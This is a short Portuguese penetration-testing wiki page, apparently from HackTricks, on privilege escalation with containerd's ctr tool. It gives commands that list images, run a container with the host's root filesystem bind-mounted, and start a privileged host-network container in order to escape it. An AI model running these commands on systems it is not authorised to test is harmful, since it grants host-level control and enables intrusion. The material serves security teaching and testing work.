# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informações básicas

Vá para o link a seguir para aprender **onde `containerd` e `ctr` se encaixam na pilha de containers**:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Se você encontrar que um host possui o comando `ctr`:
```bash
which ctr
/usr/bin/ctr
```
Você pode listar as imagens:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
E então **execute uma daquelas imagens montando o diretório raiz do host nela**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Execute um container em modo privilegiado e escape dele.\
Você pode executar um container privilegiado assim:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Então você pode usar algumas das técnicas mencionadas na página a seguir para **escapar dele abusando de capacidades privilegiadas**:


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
